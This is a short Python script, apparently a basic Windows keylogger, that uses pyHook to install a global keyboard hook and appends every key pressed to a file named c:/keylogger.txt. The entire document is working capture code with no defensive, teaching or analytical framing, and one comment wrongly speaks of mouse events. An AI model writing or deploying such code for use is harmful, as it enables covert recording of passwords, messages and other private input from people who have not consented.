import pythoncom, pyHook

def OnKeyboardEvent(event):
    f = open('c:/keylogger.txt',mode='a')
    print ('Key:', event.Key)
    f.write(event.Key)
    f.close()

# return True to pass the event to other handlers
    return True

# create a hook manager

hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
#f.write(hm.Key)
# wait forever
pythoncom.PumpMessages()
